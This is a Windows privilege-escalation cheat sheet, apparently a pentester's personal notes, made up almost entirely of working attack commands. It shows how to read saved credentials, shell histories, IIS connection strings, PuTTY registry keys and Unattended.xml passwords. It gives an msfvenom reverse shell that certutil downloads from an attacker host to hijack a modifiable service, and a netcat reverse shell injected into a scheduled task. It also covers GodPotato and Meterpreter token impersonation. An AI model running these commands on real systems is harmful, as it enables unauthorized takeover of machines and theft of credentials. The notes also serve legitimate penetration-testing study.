---
title: 5 – Privesc Windows
summary: Privilege Escalation step – a note for elevating privileges on a Windows machine.
description: Privilege Escalation step – a note for elevating privileges on a Windows machine.
---

# Windows Privesc Checklist

---

 > 
 > **<font color=red>doskey /history</font>**</br>
 > Show user input history.

 > 
 > **<font color=red>powershell -c "Get-Service"</font>**</br>
 > Return services.

 > 
 > **<font color=red>Get-ScheduledTask</font>**</br>
 > Return Scheduled tasks.

 > 
 > **<font color=red>cmdkey /list</font>**</br>
 > List saved credentials (can’t see password).</br>
 > **<font color=red>runas /savecred /user:</font>admin <font color=red>powershell.exe</font>**</br>
 > Run a program with saved creds.

 > 
 > **<font color=red>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</font>**</br>
 > Show CMD history.

 > 
 > **<font color=red>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</font>**</br>
 > Show Powershell History.

 > 
 > **<font color=red>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</font>**</br>
 > Search for database password in IIS config.

 > 
 > **<font color=red>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s</font>**</br>
 > Look for Putty credentials in registers (SimonTatham is PuTTY’s creator).

# Windows Automated Scripts

---

### POWERUP

**https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1**

 > 
 > **<font color=red>. .\PowerUp.ps1</font>**</br>
 > **<font color=red>Invoke-AllChecks</font>**

---

### PRIVESCHECK

**https://github.com/itm4n/PrivescCheck**

 > 
 > **<font color=red>Set-ExecutionPolicy Bypass -Scope process -Force</font>**</br>
 > **<font color=red>. .\PrivescCheck.ps1</font>**</br>
 > **<font color=red>Invoke-PrivescCheck</font>**</br>

---

### EXPLOIT-SUGGESTER

**https://github.com/AonCyberLabs/Windows-Exploit-Suggester** 

#### On target

 > 
 > **<font color=red>systeminfo</font>**

#### On attacker machine

 > 
 > **<font color=orange>pip install xlrd==1.2.0</font>**</br>
 > 
 > **<font color=red>windows-exploit-suggester.py --update</font>**</br>
 > **<font color=red>windows-exploit-suggester.py --systeminfo</font> systeminfo.txt <font color=red>--database</font> \[DATE\]-mssb.xls**

---

### WINPEAS

**https://github.com/carlospolop/PEASS-ng/releases**

 > 
 > **<font color=red>winPEASx64.exe</font>**
 > Run WinPEAD

#### WINPEAS Output

````
WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected YOU CAN MODIFY THIS SERVICE: AllAccess
````

#### On attacker machine

 > 
 > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] -f <font color=red>exe -o</font> Wise.exe**</br>
 > Create a reverse shell with the name of the modifiable service.
 > 
 > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
 > Open a listener.

#### On target machine

 > 
 > **<font color=red>cd "C:\\Program Files (x86)\\</font>Wise"**</br>
 > **<font color=red>certutil.exe -urlcache -f</font> http://\[ATTACKER_IP\]:\[ATTACKER_PORT\]/Wise.exe Wise.exe**</br>
 > Download crafted executable and place it where the space is in the vulnerable path.
 > 
 > **<font color=red>sc.exe stop</font> WiseBootAssistant**</br>
 > **<font color=red>sc.exe query</font> WiseBootAssistant**</br>
 > **<font color=red>sc.exe start</font> WiseBootAssistant**</br>
 > Restart the service to execute the crafted one. 

---

### ROADRECON (Azure AD)

**https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon**

# Windows Privesc Potato

---

Elevate a service user with low privileges to `NT AUTHORITY\SYSTEM` privileges.

Affected versions: 

* Windows Server 2012 to  Windows Server 2022 
* Windows 8 to Windows 11

---

### GodPotato

https://github.com/BeichenDream/GodPotato/releases

 > 
 > <font color=red>GodPotato -cmd "</font>cmd /c whoami<font color=red>"</font>
 > Privesc and run `whoami` as `NT AUTHORITY\SYSTEM`.

# Windows Privesc Abusing Schtasks

---

### Show Schtasks

 > 
 > **<font color=red>schtasks /query /tn</font> vulnerableTask <font color=red>/fo list /v</font>**</br>
 > Show detail info about the scheduled task.
 > 
 > **<font color=red>cd c:\\Program Files (x86)\\SystemScheduler\\Events</font>**</br>
 > **<font color=red>type</font> \[ID\]<font color=red>.INI_LOG.txt</font>**
 > Show tasks logs.

---

### Replace executable

 > 
 > **<font color=red>mv</font> excutedByTask.exe excutedByTask.exe.bak**</br> 
 > **<font color=red>mv</font> msfvenomeReverseShell excutedByTask.exe**
 > Replace exe that being executed by scheduled tasks.

---

### Inject scheduled task

 > 
 > **<font color=red>echo</font> c:\\tools\\nc64.exe <font color=red>-e cmd.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>\> C:\\tasks\\schtask.bat</font>**</br>
 > Inject scheduled task with reverse shell.

# Windows Privesc Abusing SE Privileges

---

Here are the most commonly abused privileges:

* SeImpersonatePrivilege
* SeAssignPrimaryPrivilege
* SeTcbPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeTakeOwnershipPrivilege
* SeDebugPrivilege

 > 
 > **<font color=red>whoami /priv</font>**</br>
 > Show current user privileges.

---

### SeDebugPrivilege and SeImpersonatePrivilege

When **SeDebugPrivilege** and **SeImpersonatePrivilege** are enabled, we can impersonate another user.

 > 
 > **<font color=red>load incognito</font>**</br>
 > **<font color=red>list_tokens -g</font>**</br>
 > List tokens.
 > 
 > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
 > Impersonate token.

To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 

The safest to pick is **services.exe**.

 > 
 > **<font color=red>migrate</font> 668**</br>
 > Migrate to process 668.

# Windows Privesc Unattended Path

Unattended Setup is the method by which OEMs (Original Equipment Manufacturers) install Windows NT in unattended mode.
C:\\Windows\\Panther\\Unattend\\Unattended.xml is where users' passwords are stored in base64. 

 > 
 > **<font color=red>type C:\\Windows\\Panther\\Unattend\\Unattended.xml</font>**</br>
 > Display unattended password.

````xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
````
